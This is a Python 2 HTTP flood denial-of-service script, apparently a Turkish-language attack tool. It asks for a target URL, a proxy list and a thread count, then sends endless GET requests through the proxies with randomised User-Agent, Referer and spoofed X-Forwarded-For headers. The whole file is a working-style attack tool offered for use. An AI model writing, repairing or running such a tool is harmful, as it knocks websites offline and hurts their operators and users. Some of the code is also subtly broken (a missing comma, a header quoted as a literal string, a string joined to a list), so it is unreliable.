#!/usr/bin/env python
#coding: utf8
 
import random
import socket
import threading
import time
userAgents = [
	     "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 6.0.1; HTCD160LVWPP Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.124 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
            "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
            "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
            "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]

reFerers = [
            "http://validator.w3.org/check?uri="
            "http://www.facebook.com/sharer/sharer.php?u="
            ]
  			
def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result
 
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
 
def randomUserAgent():
    return random.choice(userAgents)
 
def randomReFerer():
    return random.choice(reFerers)  
 
class attacco(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + randomUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1, 1000)) + "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + acceptall + "\r\n"
 
        while nload:
            time.sleep(1)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(3):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
 
 
 
print (" ")
print ("\033[31m   ___  ___  ____  _  ____  _____  ___  ____  ____ \033[0m")  
print ("\033[31m  / _ \/ _ \/ __ \| |/_/\ \/ / _ \/ _ \/ __ \/ __/ \033[0m") 
print ("\033[31m / ___/ , _/ /_/ />  <   \  / // / // / /_/ /\ \ \033[0m")    
print ("\033[31m/_/  /_/|_|\____/_/|_|   /_/____/____/\____/___/ \033[0m") 
print ("\033[33m                     Instagram : @bossy.078 \033[0m")                                               
print (" ")

url = raw_input("\033[93m [+] Hedef : \033[1m")
in_file = open(raw_input("\033[94m [+] Proxy : \033[1m"),"r")
thread = input("\033[95m [+] Threads : \033[1m")
print ("\033[0;31m [!] Programı Dudurmak Istıyorsanız CTRL + Z \033[1m")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
proxyf = in_file.read()
in_file.close()
listaproxy = proxyf.split('\n')
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
accept = "random.choice(acceptall) \r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0
 
for x in xrange(thread):
    attacco().start()
nload = 0
while not nload:
    time.sleep(1)
